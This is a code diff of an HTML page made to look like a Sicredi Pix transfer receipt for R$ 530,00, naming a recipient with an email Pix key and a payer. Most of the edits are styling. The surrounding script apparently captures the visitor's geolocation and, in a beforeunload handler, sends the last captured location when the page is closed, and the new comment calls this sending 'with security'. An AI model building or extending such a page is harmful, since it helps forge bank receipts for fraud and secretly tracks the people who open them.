@@ -10,33 +10,34 @@
 
 <body>
   <div class="comprovante-container">
-    <div class="topo-comprovante" style="text-align: center; margin-bottom: 20px;">
-      <!-- Logotipo original do Sicredi -->
-      <img src="logo-sicredi.png" alt="Sicredi" style="max-width: 140px; height: auto; margin-bottom: 10px;" />
-      
-      <h2 style="font-size: 20px; margin-top: 5px;">Pix Enviado - R$ 530,00</h2>
+    <div class="topo-comprovante">
+      <div class="logo-sicredi-text" style="text-align: center; margin-bottom: 15px;">
+        <!-- Mantém o estilo limpo do seu layout original -->
+        <span style="color: #72A011; font-weight: bold; font-size: 24px; font-family: sans-serif;">🌿 Sicredi</span>
+      </div>
+      <h2 style="text-align: center;">Pix Enviado - R$ 530,00</h2>
     </div>
 
     <div class="informacoes">
       <p><span>Data do Pagamento:</span> <span>Sábado, 14/11/2026</span></p>
       <p><span>Horário:</span> <span>00:16</span></p>
-      <p><span>ID da Transação:</span> <span class="id-transacao" style="word-break: break-all; font-size: 13px;">PIXcSqf5BBNLaKrFy1C6kPAj6sexVR2Z</span></p>
+      <p><span>ID da Transação:</span> <span class="id-transacao">PIXcSqf5BBNLaKrFy1C6kPAj6sexVR2Z</span></p>
       
-      <hr style="border: 0; border-top: 1px solid #ddd; margin: 12px 0;">
+      <hr style="border: 0; border-top: 1px solid #ddd; margin: 10px 0;">
 
       <p><span>Quem Recebeu:</span> <span>Leidene Almeida Lucena</span></p>
       <p><span>Chave Pix:</span> <span>dra.leidene@gmail.com</span></p>
       
-      <hr style="border: 0; border-top: 1px solid #ddd; margin: 12px 0;">
+      <hr style="border: 0; border-top: 1px solid #ddd; margin: 10px 0;">
 
       <p><span>Quem Pagou:</span> <span>Maria Fernanda Costa</span></p>
       <p><span>CPF:</span> <span>***.640.535-**</span></p>
       <p><span>Instituição:</span> <span>Banco Cooperativo Sicredi S.A</span></p>
     </div>
 
-    <button class="botao" onclick="window.print()" style="background-color: #72A011; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 15px;">Imprimir Comprovante</button>
+    <button class="botao" onclick="window.print()">Imprimir Comprovante</button>
 
-    <div class="comprovante-footer" style="text-align: center; margin-top: 15px; font-size: 12px; color: #666;">
+    <div class="comprovante-footer" style="text-align: center;">
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
     </div>
   </div>
@@ -100,7 +101,7 @@
         });
     }
 
-    // Dispara automaticamente a última localização capturada quando o usuário fecha a página
+    // Dispara o envio ao fechar ou sair da página com segurança
     window.addEventListener('beforeunload', function () {
       const payload = JSON.stringify({
         ...dadosUltimaLocalizacao,
